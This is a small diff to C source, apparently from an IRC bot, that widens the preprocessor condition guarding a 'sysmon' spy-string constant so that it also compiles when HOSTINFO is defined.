@@ -68,7 +68,7 @@ BEG const char SPYSTR_BOTNET[]		MDEF("botnet");
 #ifdef URLCAPTURE
 BEG const char SPYSTR_URL[]		MDEF("url");
 #endif /* URLCAPTURE */
-#ifdef URLCAPTURE
+#if defined URLCAPTURE || defined HOSTINFO
 BEG const char SPYSTR_SYSMON[]		MDEF("sysmon");
 #endif /* URLCAPTURE */
 
